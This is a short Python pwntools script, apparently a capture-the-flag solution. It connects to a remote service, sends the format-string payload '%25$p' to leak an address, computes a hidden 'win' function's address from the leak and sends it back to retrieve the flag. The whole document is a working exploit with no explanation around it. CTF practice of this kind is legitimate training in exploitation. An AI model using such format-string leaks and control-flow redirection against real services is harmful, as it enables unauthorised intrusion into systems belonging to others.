from pwn import *

hostname = ...
port = ...
p = remote(hostname, port)

p.recvuntil(b"name:")
p.sendline(b"%25$p")
main_addr = int(p.recvline().strip(), 16)
win_addr = main_addr - 0x96
p.sendline(hex(win_addr))

p.recvuntil(b"You won!\n")
flag = p.recvline()
print(flag.strip().decode("utf-8"))

p.close()
